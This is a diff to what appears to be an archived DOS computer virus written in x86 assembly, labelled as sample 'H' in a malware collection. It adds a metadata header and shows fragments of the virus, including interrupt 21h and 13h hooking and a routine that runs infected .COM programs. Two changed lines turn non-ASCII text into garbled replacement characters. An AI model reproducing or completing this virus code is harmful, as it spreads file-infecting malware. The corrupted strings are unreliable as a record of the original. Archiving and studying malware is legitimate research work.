@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      H
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 
         .radix  16
 
@@ -527,7 +538,7 @@ Run_COM_File:
 	movsw					;Run .COM program
 	ret
 
-	db	'Œ­®£® ±¬¥!'
+	db	'ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½!'
 
 INT_21h_Entry_Point:
 
@@ -1350,7 +1361,7 @@ endcode label	word
 	org_13h dd	?
 	org_21h dd	?
 	Floppy_org_13h	dd ?
-	flag	db	?	;0ff if error occureŒò
+	flag	db	?	;0ff if error occureï¿½ï¿½
 	veri	db	?
 	handle	dw	?
 	fname	db	8+3 dup (?)
